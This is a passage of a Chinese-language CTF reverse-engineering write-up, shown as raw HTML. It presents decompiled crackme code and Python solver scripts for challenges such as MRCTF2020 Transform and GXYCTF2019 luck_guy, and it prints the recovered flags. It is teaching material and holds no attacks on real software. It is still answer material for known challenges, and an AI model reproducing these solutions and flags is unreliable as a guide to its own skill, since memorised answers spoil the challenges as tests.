class="token operator">></span> <span class="token string">'Z'</span> <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> v2 <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      a1<span class="token punctuation">[</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>LABEL_9<span class="token operator">:</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token operator">++</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大小写相互转换，这里的逻辑大概清晰了，我们先找到加密后的flag如下</p><p><img src="/2021/05/28/CTF/image-20210607192901280.png" alt></p><p>这个应该就是flag转换后的样子，</p><pre class="line-numbers language-none"><code class="language-none">zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先把这个字符串大小写互换之后进行base64的换标解密，写出完整版的poc如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>enc_flag <span class="token operator">=</span> <span class="token string">'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'</span>encflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc_flag<span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> i<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token keyword">print</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token comment"># 换表base64</span>ss <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token punctuation">]</span>table<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>ss<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encflag<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;bAse64_h2s_a_Surprise&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>里面的换表的结果与原始表的排列是有关的，仔细看看那两个字符数组<code>byte_40E0A0</code>和<code>byte_40E0A0</code>就明白了。</p><h3 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h3><p><strong>TAG:简单异或</strong></p><p>首先是个exe可执行文件，先查一下是不是带壳的。</p><p><img src="/2021/05/28/CTF/image-20210608074332817.png" alt></p><p>64位无壳程序</p><p>拖入ida64位，找到关键函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-70h] BYREF</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-8h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8Ch] [rbp-4h]</span>  <span class="token function">sub_402230</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Give me your code:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E5F0</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">33</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Wrong!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    byte_414040<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Str<span class="token punctuation">[</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_414040<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_40F0E0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_414040<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Wrong!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Right!Good Job!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Here is your flag: %s\n"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到关键的数据有两个</p><pre class="line-numbers language-none"><code class="language-none">dword_40F040 &#x3D; [0x9, 0x0A, 0x0F, 0x17, 0x7, 0x18, 0x0C, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16,                0x4, 0x0D, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1F, 0x8, 0x12, 0x1A, 0x1C, 0x0E, 0x00]byte_40F0E0 &#x3D; [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A,               0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>Str</code>是flag，这里先将<code>dword_40F040</code>作为flag字符串的下标，然后<code>byte_40F0E0 = flag[dword_40F040] ^ dword_40F040</code></p><p>意思就是这么个意思啦，直接逆，由异或的特性易知<code>flag[dword_40F040] = byte_40F0E0 ^ dword_40F040</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dword_40F040 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span>                <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>byte_40F0E0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span>               <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>byte_40F0E0<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>byte_40F0E0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">[</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> byte_40F0E0<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#  MRCTF&#123;Tr4nsp0sltiON_Clph3r_1s_3z&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以说是右手就行。</p><p><strong>注意下标的那个数组的最后一位补上0x00，要不不满足33位的条件，把那个最后的0x08换成0x00</strong></p><h2 id="Linux下文件逆向-elf文件逆向"><a href="#Linux下文件逆向-elf文件逆向" class="headerlink" title="Linux下文件逆向(elf文件逆向)"></a>Linux下文件逆向(elf文件逆向)</h2><h3 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h3><p><strong>关键代码寻找与审计</strong></p><p>这题应该是可以使用ida &amp; ubuntu实现动态调试的，但是我一看配置环境还要浪费许多时间，就直接进行逆向分析好了。下面的是get_flag()函数的代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-3Ch]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-38h]</span>  __int64 s<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-28h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">200</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK, it's flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> f1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//f1=GXY&#123;do_not_</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//f2=</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar not like you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar want a girlfriend"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>        s <span class="token operator">=</span> <span class="token number">0x7F666F6067756369LL</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"emmm,you can't find flag 23333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的switch需要正确排序才能获得正确的flag，这里很明显case1是最后一个，前两个猜测分别是case4和case5，就有下面的脚本</p><p><strong>逆向脚本</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag1 <span class="token operator">=</span> <span class="token string">'GXY&#123;do_not_'</span>flag2 <span class="token operator">=</span> <span class="token string">''</span>s <span class="token operator">=</span> <span class="token string">'7F666F6067756369'</span>res1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    res1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res1 <span class="token operator">=</span> res1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment"># 这里似乎是因为大小端排序的问题似乎，然后上面的内容需要简单地逆一下</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        flag2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>res1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>res1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag1 <span class="token operator">+</span> flag2<span class="token punctuation">)</span><span class="token comment"># GXY&#123;do_not_hate_me&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h3><p><strong>查PE</strong></p><p><img src="/2021/05/28/CTF/image-20210530113755795.png" alt="PE信息"></p><p>emmm，直接拖入ida32看看吧</p><p><strong>得flag</strong></p><p>这种带有GUI的程序逆向主要就是先看字符串信息，直接查找字符串找到flag的一部分，再找到变换flag的关键函数</p><p><img src="/2021/05/28/CTF/image-20210530114039094.png" alt="image-20210530114039094"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">INT_PTR __stdcall <span class="token function">DialogFunc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT a2<span class="token punctuation">,</span> WPARAM a3<span class="token punctuation">,</span> LPARAM a4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  CHAR String<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-64h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">272</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">273</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> Format<span class="token punctuation">,</span> <span class="token operator">++</span>dword_4099F0<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_4099F0 <span class="token operator">==</span> <span class="token number">19999</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;%d%d2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">SetWindowTextA</span><span 